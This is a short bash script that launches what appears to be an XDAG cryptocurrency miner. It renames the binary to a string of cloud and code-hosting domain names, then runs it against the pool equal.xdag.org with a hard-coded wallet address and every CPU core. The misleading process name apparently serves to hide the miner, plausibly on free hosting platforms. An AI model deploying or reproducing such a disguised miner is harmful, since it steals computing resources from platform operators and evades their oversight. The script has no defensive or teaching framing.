#!/bin/bash
chmod u+x dag
mv dag scalingo.com.google.com.heroku.com.github.com
./scalingo.com.google.com.heroku.com.github.com -cpu -a a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p equal.xdag.org:13656 -t $(nproc --all)
